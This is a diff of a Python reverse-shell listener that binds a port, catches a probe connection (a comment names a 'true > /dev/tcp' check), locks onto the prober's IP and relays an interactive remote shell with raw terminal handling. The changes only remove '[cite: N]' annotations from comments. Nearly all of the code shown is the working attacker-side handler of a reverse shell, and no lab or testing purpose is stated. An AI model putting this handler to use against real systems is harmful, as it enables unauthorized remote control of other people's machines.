@@ -27,7 +27,7 @@ def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.settimeout(TIMEOUT)
-    server.bind(('0.0.0.0', PORT)) # [cite: 2]
+    server.bind(('0.0.0.0', PORT))
     server.listen(1)
 
     shell_conn = None
@@ -35,7 +35,7 @@ def main():
     try:
         print(f"[*] Listening on {PORT}... (Timeout {TIMEOUT}s)")
         
-        # 1. CATCH THE PROBE (The 'true > /dev/tcp' check) [cite: 2]
+        # 1. CATCH THE PROBE (The 'true > /dev/tcp' check)
         probe_conn, addr = server.accept()
         authorized_ip = addr[0]  # Lock onto the IP that probed us 
         print(f"[*] Connection 1 (Probe) from {authorized_ip}.")
@@ -67,13 +67,13 @@ def main():
             r, w, e = select.select([shell_conn, sys.stdin], [], [])
             
             if shell_conn in r:
-                data = shell_conn.recv(4096) # [cite: 6]
+                data = shell_conn.recv(4096)
                 if not data: break 
                 os.write(sys.stdout.fileno(), data)
             
             if sys.stdin in r:
                 data = os.read(fd, 4096)
-                if not data: break # [cite: 7]
+                if not data: break
                 shell_conn.sendall(data)
 
     except (socket.timeout, TimeoutError):
@@ -83,7 +83,7 @@ def main():
     finally:
         # Restore terminal to original "cooked" state 
         termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-        if shell_conn: # 
+        if shell_conn: 
             shell_conn.close()
         server.close()
         print("\n[+] Terminal restored.")
